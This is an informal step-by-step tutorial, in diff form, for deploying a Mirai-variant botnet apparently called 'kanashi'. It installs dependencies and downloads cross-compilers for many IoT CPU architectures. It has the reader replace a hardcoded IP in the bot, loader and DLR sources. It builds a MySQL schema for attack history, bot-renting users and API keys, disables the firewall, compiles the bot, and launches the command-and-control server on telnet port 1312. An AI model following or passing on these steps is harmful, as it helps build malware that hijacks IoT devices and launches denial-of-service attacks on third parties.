@@ -1,0 +1,155 @@
+ Tutorial by slumpthegod   
+
+
+Server Requirements:
+4 GIG ram
+Cent os 6.9
+
+
+HERE WE ARE GONNA INSTALL THE DEPENDICIES
+JUST COPE ALL AT OUNCE AND PASTE IN UR SERVER
+
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+
+
+HERE WE ARE GETTING THE BINS COPY ALL AND PASTE
+
+
+mkdir /etc/xcompile
+cd /etc/xcompile 
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
+wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+rm -rf *.tar.bz2
+mv cross-compiler-i586 i586
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+
+cd /tmp
+wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
+tar -xzf go1.9.4.linux-amd64.tar.gz
+mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+
+OK NOW THAT WE COMPLIED AND INSTALL THE DEPENDCIES NOW WERE GONNA EDIT THE SOURCE AND 
+PUT UR IP IN THE NEED FILES
+STEP 1 IN THE BOT FOLDER GO TO INCLUDES.H WERE IT SAYS 178.128.165.33 REPLACE IT WITH UR SERVER IP 
+STEP 2 IN THE DLR FOLDER AND OPEN MAIN.C WERE MY IP IS 178,128,165,33 PASTE URS BUT MAKE SURE IT HAS , INSTEAD OF .
+STEP 3 IN THE LOADER FILE OPEN MAIN.C AND WERE U SEE MY IP 178.128.165.33 REPLACE IT WITH URS 
+STEP 4 GO INTO THE HEADERS FOLDER AND GO INTO config.H AND REPLACE 178.128.165.33 WITH UR IP 
+NOW THAT WE GOT IT ALL DONE WE HAVE TO SETUP THE DATABASE
+MAKE SURE U SET THE PASSWORD AS root
+
+{PASTE THIS AT THE SAME TIME}
+THEN WHEN IT ASK U TO TYPE THE PASSWORD TYPE "root" then click yes on all
+service mysqld start
+mysql_secure_installation
+
+// Now Login with your mysql pass by running this command:
+
+mysql -proot
+
+// Now we will add the database, copy and paste this on your terminal:
+
+CREATE DATABASE kanashi;
+use kanashi;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO users VALUES (NULL, 'slumpx', 'root', 0, 0, 0, 0, -1, 1, 30, '');
+exit;
+
+DO THIS BEFORE COMPILING AND SCREENING
+
+service iptables stop 
+service httpd restart  
+service mysqld restart
+
+NOW WE CAN COMPILE AND SCREEN AFTER U RUN THE SCREEN ./CNC OPEN PUTTY AND MAKE A NEW SESION THE PORT IS 1312
+
+cd ~/
+chmod 0777 * -R
+sh build.sh
+screen ./cnc
+
+// Now your mirai is done. connect throught telnet port: 1312
+
+
+
+
+
+
+
+
+
+
+
